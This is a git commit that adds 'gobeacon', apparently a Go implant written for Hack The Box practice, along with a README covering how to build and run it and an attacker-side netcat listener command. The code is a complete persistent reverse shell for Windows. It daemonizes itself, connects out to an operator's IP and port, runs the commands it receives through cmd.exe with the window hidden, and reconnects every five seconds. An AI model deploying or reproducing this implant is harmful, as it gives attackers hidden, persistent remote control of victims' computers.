3727b5cff94022eb428cdd83479f34b9aeb93e3f
unknown <rptucker@liberty.edu>
2020-11-04 16:54:18 -0500

    Initial commit

--- README.md
+++ README.md
@@ -1,2 +1,34 @@
-# gobeacon-win
-A windows golang beaconing implant for HTB. 
+# gobeacon
+A small beaconing windows implant that daemonizes itself (it's golang...) and calls out to the user. If the shell dies, the implant beacons again in 5 seconds.
+
+## Compilation
+```go
+go build gobeacon.go
+```
+
+## Usage:
+```go
+./gobeacon start <IP> <PORT>
+```
+
+## Example
+On target:
+```
+./gobeacon start 127.0.0.1 9001
+```
+On attacker:
+```sh
+rlwrap nc -lvnp 9001
+```
+
+To stop the beacon:
+```
+./gobeacon stop 127.0.0.1 9001
+```
+OR
+From inside the shell
+```
+beacon> exit
+```
+### Creds
+Creds to this blogpost where I ripped the daemonization code from: https://socketloop.com/tutorials/golang-daemonizing-a-simple-web-server-process-example
---
+++ gobeacon-win.go
@@ -0,0 +1,168 @@
+package main
+
+import (
+	"bufio"
+	"fmt"
+	"io/ioutil"
+	"log"
+	"net"
+	"os"
+	"os/exec"
+	"strconv"
+	"strings"
+	"syscall"
+	"time"
+)
+
+var tmpDir = os.TempDir()
+var PIDFile = tmpDir + "\\daemonize.pid"
+
+func savePID(pid int) {
+
+	file, err := os.Create(PIDFile)
+	if err != nil {
+		log.Printf("Unable to create pid file : %v\n", err)
+		os.Exit(1)
+	}
+
+	defer file.Close()
+
+	_, err = file.WriteString(strconv.Itoa(pid))
+
+	if err != nil {
+		log.Printf("Unable to create pid file : %v\n", err)
+		os.Exit(1)
+	}
+
+	file.Sync() // flush to disk
+
+}
+
+func checkFile(file string) bool {
+	if _, err := os.Stat(file); err == nil {
+		return true
+
+	} else {
+		return false
+
+	}
+}
+
+func shell(ip string, port string) {
+	conn, err := net.Dial("tcp", ip+":"+port)
+	if err != nil {
+		fmt.Printf("%s\n", err)
+		return
+	}
+
+	for {
+		fmt.Fprintf(conn, "beacon> ")
+		message, err := bufio.NewReader(conn).ReadString('\n')
+		if err != nil {
+			fmt.Printf("%s\n", err)
+			return
+		}
+		userCommand := strings.TrimSuffix(message, "\n")
+		if userCommand == "exit" {
+			os.Remove(PIDFile)
+			return
+		}
+		cmd := exec.Command("cmd", "/C", userCommand+"\n")
+		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+		out, _ := cmd.CombinedOutput()
+
+		if err != nil {
+			fmt.Fprintf(conn, "%s\n", err)
+		}
+		//fmt.Fprintf(conn, "CMD: %s\n", userCommand)
+		fmt.Fprintf(conn, "%s\n", out)
+
+	}
+}
+
+func main() {
+	if len(os.Args) != 4 {
+		fmt.Printf("Usage : %s [start|stop] <IP> <Port>\n ", os.Args[0]) // return the program name back to %s
+		os.Exit(0)                                                       // graceful exit
+	}
+	//fmt.Println("Args: " + os.Args[1] + " " + os.Args[2] + " " + os.Args[3])
+	if strings.ToLower(os.Args[1]) == "main" {
+		for {
+			if checkFile(PIDFile) {
+				shell(os.Args[2], os.Args[3])
+				seconds := 5
+				time.Sleep(time.Second * time.Duration(seconds))
+			} else {
+				break
+			}
+		}
+	}
+
+	if strings.ToLower(os.Args[1]) == "start" {
+
+		// check if daemon already running.
+		if _, err := os.Stat(PIDFile); err == nil {
+			fmt.Println("Already running or " + PIDFile + " file exist.")
+			os.Exit(1)
+		}
+
+		cmd := exec.Command(os.Args[0], "main", os.Args[2], os.Args[3])
+		cmd.Start()
+		fmt.Println("Daemon process ID is : ", cmd.Process.Pid)
+		savePID(cmd.Process.Pid)
+		os.Exit(0)
+
+	}
+
+	// upon receiving the stop command
+	// read the Process ID stored in PIDfile
+	// kill the process using the Process ID
+	// and exit. If Process ID does not exist, prompt error and quit
+
+	if strings.ToLower(os.Args[1]) == "stop" {
+		if _, err := os.Stat(PIDFile); err == nil {
+			data, err := ioutil.ReadFile(PIDFile)
+			if err != nil {
+				fmt.Println("Not running")
+				os.Exit(1)
+			}
+			ProcessID, err := strconv.Atoi(string(data))
+
+			if err != nil {
+				fmt.Println("Unable to read and parse process id found in ", PIDFile)
+				os.Exit(1)
+			}
+
+			process, err := os.FindProcess(ProcessID)
+
+			if err != nil {
+				fmt.Printf("Unable to find process ID [%v] with error %v \n", ProcessID, err)
+				os.Exit(1)
+			}
+			// remove PID file
+			os.Remove(PIDFile)
+
+			fmt.Printf("Killing process ID [%v] now.\n", ProcessID)
+			// kill process and exit immediately
+			err = process.Kill()
+
+			if err != nil {
+				fmt.Printf("Unable to kill process ID [%v] with error %v \n", ProcessID, err)
+				os.Exit(1)
+			} else {
+				fmt.Printf("Killed process ID [%v]\n", ProcessID)
+				os.Exit(0)
+			}
+
+		} else {
+
+			fmt.Println("Not running.")
+			os.Exit(1)
+		}
+	} else {
+		fmt.Printf("Unknown command : %v\n", os.Args[1])
+		fmt.Printf("Usage : %s [start|stop] <IP> <PORT> \n", os.Args[0]) // return the program name back to %s
+		os.Exit(1)
+	}
+
+}
